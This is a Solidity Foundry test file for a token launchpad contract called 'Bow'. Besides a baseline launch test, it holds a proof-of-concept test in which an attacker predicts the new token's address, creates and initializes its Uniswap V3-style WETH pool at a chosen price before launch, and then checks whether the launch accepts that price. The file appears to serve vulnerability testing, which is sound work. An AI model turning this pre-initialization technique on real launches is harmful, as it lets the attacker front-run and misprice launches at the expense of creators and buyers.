// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {Test, console} from "forge-std/Test.sol";

struct LaunchParams {
    string name;
    string symbol;
    uint256 totalSupply;
    uint256 launchDelay;
    uint256 maxWallet;
    uint256 limitWindow;
    uint256 targetFdvWeth;
    bytes32 salt;
    string description;
    string website;
    string telegram;
    string twitter;
    string logoURI;
    string tokenURI;
    uint256 devBuyMinTokens;
}

interface IBow {
    function launch(LaunchParams calldata p) external payable returns (address token, uint256 positionId);
    function tokenInitCodeHash(LaunchParams calldata p, address creator) external pure returns (bytes32);
    function predictToken(bytes32 salt, bytes32 initCodeHash) external view returns (address);
}

interface IV3F {
    function getPool(address a, address b, uint24 f) external view returns (address);
    function createPool(address a, address b, uint24 f) external returns (address);
}
interface IV3P {
    function initialize(uint160 p) external;
    function slot0() external view returns (uint160, int24, uint16, uint16, uint16, uint8, bool);
}

contract BowTest is Test {
    address constant F = 0xC70E510E14710Ea535CAB7b2414860aF63FEab79;
    address constant V3 = 0x1f7d7550B1b028f7571E69A784071F0205FD2EfA;
    address constant WETH = 0x0Bd7D308f8E1639FAb988df18A8011f41EAcAD73;
    address creator = address(0xC0FFEE);

    function _p(bytes32 salt) internal pure returns (LaunchParams memory p) {
        p = LaunchParams({
            name: "T", symbol: "T", totalSupply: 1e27, launchDelay: 0,
            maxWallet: 2e25, limitWindow: 10, targetFdvWeth: 1.5 ether, salt: salt,
            description: "", website: "", telegram: "", twitter: "", logoURI: "", tokenURI: "",
            devBuyMinTokens: 0
        });
    }

    function test_baseline() public {
        vm.deal(creator, 2 ether);
        LaunchParams memory p = _p(keccak256("b1"));
        vm.prank(creator);
        (address t, uint256 id) = IBow(F).launch(p);
        console.log("ok", t, id);
        assertTrue(t != address(0));
    }

    function test_preinit() public {
        vm.deal(creator, 2 ether);
        LaunchParams memory p = _p(keccak256("p1"));
        bytes32 h = IBow(F).tokenInitCodeHash(p, creator);
        address pred = IBow(F).predictToken(p.salt, h);
        console.log("pred", pred);
        address t0 = pred < WETH ? pred : WETH;
        address t1 = pred < WETH ? WETH : pred;
        address pool = IV3F(V3).createPool(t0, t1, 10000);
        IV3P(pool).initialize(79228162514264337593543950336);
        (uint160 sp0,,,,,,) = IV3P(pool).slot0();
        console.log("attackSp", sp0);
        vm.prank(creator);
        try IBow(F).launch(p) returns (address t, uint256 id) {
            console.log("SUCCESS", t, id);
            (uint160 sp,,,,,,) = IV3P(pool).slot0();
            console.log("afterSp", sp);
            console.log("samePrice", sp == sp0);
        } catch Error(string memory r) {
            console.log("REVERT str", r);
        } catch (bytes memory r) {
            console.log("REVERT bytes");
            console.logBytes(r);
        }
    }
}
